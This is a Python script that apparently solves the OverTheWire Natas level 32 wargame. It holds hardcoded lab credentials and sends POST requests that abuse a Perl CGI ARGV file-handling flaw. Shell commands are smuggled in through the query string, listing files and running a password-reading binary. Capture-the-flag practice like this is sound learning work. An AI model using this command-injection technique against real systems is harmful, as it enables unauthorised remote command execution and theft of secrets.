import requests
import re

username = "natas32"
passsowrd = "Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()

response = requests.post(url + '/index.pl?ls -la . | xargs echo |',
                         files=[('file', ('filename', 'anything'))],
                         data={'file': 'ARGV'},
                         auth=(username,passsowrd))
content = response.text

print(content,'\n','='*80)

response = requests.post(url + '/index.pl?./getpassword | xargs echo |',
                         files=[('file', ('filename', 'anything'))],
                         data={'file': 'ARGV'},
                         auth=(username,passsowrd))
content = response.text
print(content)


